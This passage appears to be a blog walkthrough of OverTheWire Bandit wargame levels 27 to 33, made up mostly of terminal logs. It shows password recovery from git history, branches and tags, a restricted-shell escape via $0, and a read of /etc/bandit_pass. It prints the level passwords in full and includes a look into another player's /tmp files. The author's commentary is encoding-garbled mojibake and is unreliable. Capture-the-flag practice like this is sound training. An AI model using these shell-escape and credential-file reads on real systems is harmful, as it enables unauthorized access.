' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! bandit27@bandit:~$git clone ssh://bandit27-git@localhost/home/bandit27-git/repofatal: could not create work tree dir 'repo': Permission denied bandit27@bandit:~$git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo fatal: could not create work tree dir 'repo': Permission denied bandit27@bandit:~$cd /tmp bandit27@bandit:/tmp$mkdir b27r bandit27@bandit:/tmp$cd b27r bandit27@bandit:/tmp/b27r$git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo Cloning into 'repo'... ssh: connect to host localhost port 2220: Connection refused fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. bandit27@bandit:/tmp/b27r$git clone ssh://bandit27-git@localhost/home/bandit27-git/repo Cloning into 'repo'... Could not create directory '/home/bandit27/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27-git@localhost's password: remote: Counting objects: 3, done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0) Receiving objects: 100% (3/3), done. bandit27@bandit:/tmp/b27r$ls repo bandit27@bandit:/tmp/b27r$cd repo bandit27@bandit:/tmp/b27r/repo$ls README bandit27@bandit:/tmp/b27r/repo$bandit27@bandit:/tmp/b27r/repo$cat README The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2 bandit27@bandit:/tmp/b27r/repo$  ç”±é¢˜ç›®çŸ¥é“gitçš„å¯†ç å’Œæœ¬å…³flagä¸€æ ·\nå¾ˆç®€å•çš„ä¸€ä¸ªgitçš„ç”¨æ³•ï¼Œgitæ”¯æŒsshåè®®è¿™åœ¨ä¹‹å‰å°±å·²ç»çŸ¥é“äº†\næ‰€ä»¥ç›´æ¥è¿›å…¥bandit27å»cloneä»“åº“\nç»“æœæ²¡æœ‰æƒé™ï¼Œä»¥ä¸ºæ˜¯ç«¯å£é”™äº†ï¼Œç»“æœæ˜¯å¿˜äº†æˆ‘ä»¬å¯¹bandit27çš„homeç›®å½•æ²¡æœ‰è¯»å†™æƒé™\nè€åŠæ³•ï¼Œå»tmpåˆ›ä¸€ä¸ªæ–°ç›®å½•ï¼Œç„¶åcloneï¼Œæœç„¶æˆåŠŸï¼Œflagåœ¨repoé‡Œçš„READMEé‡Œ\nlevel 29 æ— æ„çš„å‘ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  bandit12@bandit:~$ ls data.txt bandit12@bandit:~$ ls /tmp/fuck repo bandit12@bandit:~$ ls /tmp/fuck/repo README.md bandit12@bandit:~$ ls /tmp/fuck/repo/README.md /tmp/fuck/repo/README.md bandit12@bandit:~$ cat /tmp/fuck/repo/README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: bbc96594b4e001778eee9975372716b2   åŸæ¥æ˜¯ç¢°å·§æœ‰äººåœ¨/tmp/fuckåˆ›å»ºäº†è¿™ä¸ªgitä»“åº“ï¼ŒåŒé“ä¸­äººå•Š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120  bl@bl-virtual-machine:~/wargame$ ssh bandit28@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit28@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! Enjoy your stay! bandit28@bandit:~$ls bandit28@bandit:~$mkdir /tmp/b28r bandit28@bandit:~$cd /tmp/b28r bandit28@bandit:/tmp/b28r$ls bandit28@bandit:/tmp/b28r$git clone ssh://bandit28-git@localhost/home/bandit28-git/repo Cloning into 'repo'... Could not create directory '/home/bandit28/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit28-git@localhost's password: remote: Counting objects: 9, done. remote: Compressing objects: 100% (6/6), done. remote: Total 9 (delta 2), reused 0 (delta 0) Receiving objects: 100% (9/9), done. Resolving deltas: 100% (2/2), done. bandit28@bandit:/tmp/b28r$ls repo bandit28@bandit:/tmp/b28r$cd repo bandit28@bandit:/tmp/b28r/repo$ls README.md bandit28@bandit:/tmp/b28r/repo$cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: xxxxxxxxxx bandit28@bandit:/tmp/b28r/repo$ls -al total 16 drwxr-sr-x 3 bandit28 root 4096 Feb 26 04:12 . drwxr-sr-x 3 bandit28 root 4096 Feb 26 04:12 .. drwxr-sr-x 8 bandit28 root 4096 Feb 26 04:12 .git -rw-r--r-- 1 bandit28 root 111 Feb 26 04:12 README.md bandit28@bandit:/tmp/b28r/repo$ls .git branches description hooks info objects refs config HEAD index logs packed-refs bandit28@bandit:/tmp/b28r/repo$ls .git/branches/ bandit28@bandit:/tmp/b28r/repo$cat .git/HEAD ref: refs/heads/master bandit28@bandit:/tmp/b28r/repo$git log commit 073c27c130e6ee407e12faad1dd3848a110c4f95 Author: Morla Porla \u003cmorla@overthewire.org\u003e Date: Tue Oct 16 14:00:39 2018 +0200 fix info leak commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb Author: Morla Porla \u003cmorla@overthewire.org\u003e Date: Tue Oct 16 14:00:39 2018 +0200 add missing data commit b67405defc6ef44210c53345fc953e6a21338cc7 Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:39 2018 +0200 initial commit of README.md bandit28@bandit:/tmp/b28r/repo$git revert 186a1038cc54d1358d42d468cdc8e3cc28a93fcb error: could not revert 186a103... add missing data hint: after resolving the conflicts, mark the corrected paths hint: with 'git add \u003cpaths\u003e' or 'git rm \u003cpaths\u003e' hint: and commit the result with 'git commit' bandit28@bandit:/tmp/b28r/repo$git reset --hard 186a1038cc54d1358d42d468cdc8e3cc28a93fcb HEAD is now at 186a103 add missing data bandit28@bandit:/tmp/b28r/repo$ls README.md bandit28@bandit:/tmp/b28r/repo$cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: bbc96594b4e001778eee9975372716b2 bandit28@bandit:/tmp/b28r/repo$git reset --hard b67405defc6ef44210c53345fc953e6a21338cc7 HEAD is now at b67405d initial commit of README.md bandit28@bandit:/tmp/b28r/repo$cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: \u003cTBD\u003e bandit28@bandit:/tmp/b28r/repo$  è€åŠæ³•ï¼Œç›´æ¥tmpç›®å½•åˆ›å»ºæ–°ç›®å½•ï¼Œç„¶åclone\nå‘ç°READMEé‡Œæ˜æ˜¾æœ‰ä¸€ä¸ªå‡flagxxxxxxï¼Œå…¶ä»–ä¹Ÿæ²¡å•¥ä¸œè¥¿å¯æ¨æµ‹çš„ï¼Œé¢˜ç›®ä¹Ÿå°±åªæœ‰ä¸€ä¸ªgitçš„æç¤ºï¼Œæˆ‘ä»¬ä¾¿æƒ³åˆ°gitçš„åˆ†æ”¯å’Œå›æ»šï¼ŒæŸ¥çœ‹branchå‘ç°æ²¡æœ‰å…¶ä»–åˆ†æ”¯ï¼Œgit logå‘ç°æœ‰ä»¥å‰çš„æäº¤ï¼Œåˆ©ç”¨å‘½ä»¤git reset --hard \u003ccommit_id\u003eå›æ»šåˆ°å¯¹åº”ç‰ˆæœ¬ï¼Œç„¶åcat README.mdå¾—åˆ°flagï¼šbbc96594b4e001778eee9975372716b2\n è¿˜å¯ä»¥ç”¨git show æŸ¥çœ‹ç‰ˆæœ¬å·®åˆ«\n level 30 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115  Enjoy your stay! bandit29@bandit:~$ mkdir /tmp/b29r bandit29@bandit:~$ cd /tmp/b29r bandit29@bandit:/tmp/b29r$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo Cloning into 'repo'... Could not create directory '/home/bandit29/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit29-git@localhost's password: remote: Counting objects: 16, done. remote: Compressing objects: 100% (11/11), done. remote: Total 16 (delta 2), reused 0 (delta 0) Receiving objects: 100% (16/16), done. Resolving deltas: 100% (2/2), done. bandit29@bandit:/tmp/b29r$ ls repo bandit29@bandit:/tmp/b29r$ cd repo bandit29@bandit:/tmp/b29r/repo$ ls README.md bandit29@bandit:/tmp/b29r/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u003cno passwords in production!\u003e bandit29@bandit:/tmp/b29r/repo$ git log commit 84abedc104bbc0c65cb9eb74eb1d3057753e70f8 Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:41 2018 +0200 fix username commit 9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650 Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:41 2018 +0200 initial commit of README.md bandit29@bandit:/tmp/b29r/repo$ ls .git/branches/ bandit29@bandit:/tmp/b29r/repo$ ls .git branches description hooks info objects refs config HEAD index logs packed-refs bandit29@bandit:/tmp/b29r/repo$ cat .git/config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \"origin\"] url = ssh://bandit29-git@localhost/home/bandit29-git/repo fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master bandit29@bandit:/tmp/b29r/repo$ git reset --hard 84abedc104bbc0c65cb9eb74eb1d3057753e70f8 HEAD is now at 84abedc fix username bandit29@bandit:/tmp/b29r/repo$ ls README.md bandit29@bandit:/tmp/b29r/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u003cno passwords in production!\u003e bandit29@bandit:/tmp/b29r/repo$ bandit29@bandit:/tmp/b29r/repo$ cat .git/HEAD ref: refs/heads/master bandit29@bandit:/tmp/b29r/repo$ git branch * master bandit29@bandit:/tmp/b29r/repo$ git branch -a * master remotes/origin/HEAD -\u003e origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev bandit29@bandit:/tmp/b29r/repo$ git checkout origin/dev Note: checking out 'origin/dev'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b \u003cnew-branch-name\u003e HEAD is now at 33ce2e9... add data needed for development bandit29@bandit:/tmp/b29r/repo$ ls code README.md bandit29@bandit:/tmp/b29r/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: 5b90576bedb2cc04c86a9e924ce42faf bandit29@bandit:/tmp/b29r/repo$ ls code gif2ascii.py bandit29@bandit:/tmp/b29r/repo$ cat code/gif2ascii.py bandit29@bandit:/tmp/b29r/repo$   git logå‘ç°å°±åªæœ‰ä¸¤æ¬¡æäº¤ï¼Œcat READMEå‘ç°è¯´å¯†ç ä¸åœ¨production\n https://www.cnblogs.com/jiangzhaowei/p/7879916.html\n è¿™é‡Œæœç„¶å‡ºç°äº†ä¸­è‹±çš„å·®åˆ«ï¼Œç™¾åº¦æ‰å¾—çŸ¥productionå°±æ˜¯æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„masteråˆ†æ”¯ï¼Œä¸Šæ–‡ä¸­å¯ä»¥çœ‹åˆ°gitå¼€å‘ä¸­å¸¸è§çš„å‡ ä¸ªåˆ†æ”¯devï¼Œmasterï¼Œreleaseç­‰\nç›´æ¥git branch -a æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ï¼Œåˆ‡æ¢åˆ°devåˆ†æ”¯ï¼Œä¾¿å¾—åˆ°äº†flagï¼š5b90576bedb2cc04c86a9e924ce42faf\nlevel 31 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65  bandit30@bandit:~$ mkdir /tmp/b30r bandit30@bandit:~$ cd /tmp/b30r bandit30@bandit:/tmp/b30r$ ls bandit30@bandit:/tmp/b30r$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo Cloning into 'repo'... Could not create directory '/home/bandit30/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit30-git@localhost's password: remote: Counting objects: 4, done. remote: Total 4 (delta 0), reused 0 (delta 0) Receiving objects: 100% (4/4), done. bandit30@bandit:/tmp/b30r$ cd repo bandit30@bandit:/tmp/b30r/repo$ ls README.md bandit30@bandit:/tmp/b30r/repo$ cat README.md just an epmty file... muahaha bandit30@bandit:/tmp/b30r/repo$ git log commit 3aa4c239f729b07deb99a52f125893e162daac9e Author: Ben Dover \u003cnoone@overthewire.org\u003e Date: Tue Oct 16 14:00:44 2018 +0200 initial commit of README.md bandit30@bandit:/tmp/b30r/repo$ cat .git/config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \"origin\"] url = ssh://bandit30-git@localhost/home/bandit30-git/repo fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master bandit30@bandit:/tmp/b30r/repo$ git branch -a * master remotes/origin/HEAD -\u003e origin/master remotes/origin/master bandit30@bandit:/tmp/b30r/repo$ ls .git branches description hooks info objects refs config HEAD index logs packed-refs bandit30@bandit:/tmp/b30r/repo$ cat .git/description Unnamed repository; edit this file 'description' to name the repository. bandit30@bandit:/tmp/b30r/repo$ git status On branch master Your branch is up-to-date with 'origin/master'. nothing to commit, working tree clean bandit30@bandit:/tmp/b30r/repo$ git diff --cache error: invalid option: --cache bandit30@bandit:/tmp/b30r/repo$ git diff --cached bandit30@bandit:/tmp/b30r/repo$ git diff bandit30@bandit:/tmp/b30r/repo$ git diff HEAD bandit30@bandit:/tmp/b30r/repo$ git show-ref 3aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master 3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD 3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/master f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret bandit30@bandit:/tmp/b30r/repo$ git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea47e603bb428404d265f59c42920d81e5 bandit30@bandit:/tmp/b30r/repo$    https://cloud.tencent.com/developer/section/1138782\nhttps://www.softwhy.com/article-8540-1.html\ngit show-refï¼šæŸ¥çœ‹æœ¬åœ°å¼•ç”¨\n å¾—åˆ°äº†å¥‡å¥‡æ€ªæ€ªçš„æ–°çŸ¥è¯†äº†\nlevel 32 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86  bandit31@bandit:~$ mkdir /tmp/b31r bandit31@bandit:~$ cd /tmp/b31r bandit31@bandit:/tmp/b31r$ git clone ssh://bandit31-git@localhosthome/bandit31-git/repo Cloning into 'repo'... ssh: Could not resolve hostname localhosthome: No address associated with hostname fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. bandit31@bandit:/tmp/b31r$ ls bandit31@bandit:/tmp/b31r$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo Cloning into 'repo'... Could not create directory '/home/bandit31/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: remote: Counting objects: 4, done. remote: Compressing objects: 100% (3/3), done. remote: Total 4 (delta 0), reused 0 (delta 0) Receiving objects: 100% (4/4), done. bandit31@bandit:/tmp/b31r$ cd repo bandit31@bandit:/tmp/b31r/repo$ ls README.md bandit31@bandit:/tmp/b31r/repo$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: 'May I come in?' Branch: master bandit31@bandit:/tmp/b31r/repo$ touch key.txt bandit31@bandit:/tmp/b31r/repo$ echo 'May I come in?' \u003e\u003e key.txt bandit31@bandit:/tmp/b31r/repo$ cat key.txt May I come in? bandit31@bandit:/tmp/b31r/repo$ git add key.txt The following paths are ignored by one of your .gitignore files: key.txt Use -f if you really want to add them. bandit31@bandit:/tmp/b31r/repo$ git add -f key.txt bandit31@bandit:/tmp/b31r/repo$ ls -al total 24 drwxr-sr-x 3 bandit31 root 4096 Feb 26 04:47 . drwxr-sr-x 3 bandit31 root 4096 Feb 26 04:46 .. drwxr-sr-x 8 bandit31 root 4096 Feb 26 04:48 .git -rw-r--r-- 1 bandit31 root 6 Feb 26 04:46 .gitignore -rw-r--r-- 1 bandit31 root 15 Feb 26 04:47 key.txt -rw-r--r-- 1 bandit31 root 147 Feb 26 04:46 README.md bandit31@bandit:/tmp/b31r/repo$ cat .gitignore *.txt bandit31@bandit:/tmp/b31r/repo$ git commit -m \"Hello\" [master de012c9] Hello 1 file changed, 1 insertion(+) create mode 100644 key.txt bandit31@bandit:/tmp/b31r/repo$ git push Could not create directory '/home/bandit31/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: Counting objects: 3, done. Delta compression using up to 4 threads. Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 319 bytes | 0 bytes/s, done. Total 3 (delta 0), reused 0 (delta 0) remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: 56a9bf19c63d650ce78e6ec0354ee45e remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost/home/bandit31-git/repo ! [remote rejected] master -\u003e master (pre-receive hook declined) error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo' bandit31@bandit:/tmp/b31r/repo$   è¿™ä¸€å…³ç›®çš„é€šè¿‡READMEå¯çœ‹åˆ°ï¼Œæ˜¯éœ€è¦pushåˆ°è¿œç¨‹ä»“åº“ï¼Œè¿™å¯¹æˆ‘ä»¬å†ç†Ÿæ‚‰ä¸è¿‡äº†\nä¸è¿‡ï¼Œè¿™æœ‰ä¸ªå‘å°±æ˜¯.gitignoreï¼Œé‡Œé¢å¿½ç•¥äº†*.txt\nç”¨git add -fæˆ–åˆ æ‰.gitignoreéƒ½è¡Œï¼Œç„¶åpushä¸Šå»ï¼Œè¿™æ“ä½œå¤ªéªšäº†ï¼Œæ”¹å†™äº†git pushå¤±è´¥çš„è¿”å›ç»“æœï¼Œåœ¨ç»“æœé‡Œç»™å‡ºäº†flag\nlevel 33 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109  bl@bl-virtual-machine:~/wargame$ ssh bandit32@bandit.labs.overthewire.org -p 2220This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit32@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! WELCOME TO THE UPPERCASE SHELL \u003e\u003e #!/bin/sh \u003e\u003e bash sh: 1: BASH: not found \u003e\u003e man sh: 1: MAN: not found \u003e\u003e sh sh: 1: SH: not found \u003e\u003e $0$ls uppershell $id uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32) $pwd /home/bandit32 $cat /etc/bandit_pass/bandit32 cat: /etc/bandit_pass/bandit32: Permission denied $cat /etc/bandit_pass/bandit33 c9c3199ddf4121b10cf581a98d51caee $  è¿™å…³æ˜¯çœŸçš„éªšï¼ŒLinuxä¸­å¤§å°å†™ä¸¥æ ¼åŒºåˆ†ï¼Œå¯¼è‡´æˆ‘ä»¬çš„å‘½ä»¤éƒ½æ‰§è¡Œä¸äº†\nåæ¥çœ‹é¢˜è§£å¾—çŸ¥$0å¯ä»¥ç›´æ¥è¿›å…¥shï¼Œç„¶åå°±å¯ä»¥äº†woc\nè¿˜æœ‰ä¸€ä¸ªé¢˜è§£æ˜¯åˆ©ç”¨sshåè®®ï¼Œä¼ ä¸€ä¸ªbashè„šæœ¬(å¦‚ä¸‹)ï¼Œæ”¾åœ¨tmpæ–‡ä»¶å¤¹ä¸‹ï¼Œç”¨å¤§å†™æ–‡ä»¶å./TESTé€ƒé€¸ï¼Œç„¶åæ‰§è¡Œbashï¼Œä¸è¿‡è¿˜æ˜¯æ²¡æœ‰ä¸Šé¢è¿™ä¸ªåŠæ³•ç®€å•æš´åŠ›\n#!/bin/bash bash level 34 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102  bl@bl-virtual-machine:~/wargame$ ssh bandit33@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit33@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF 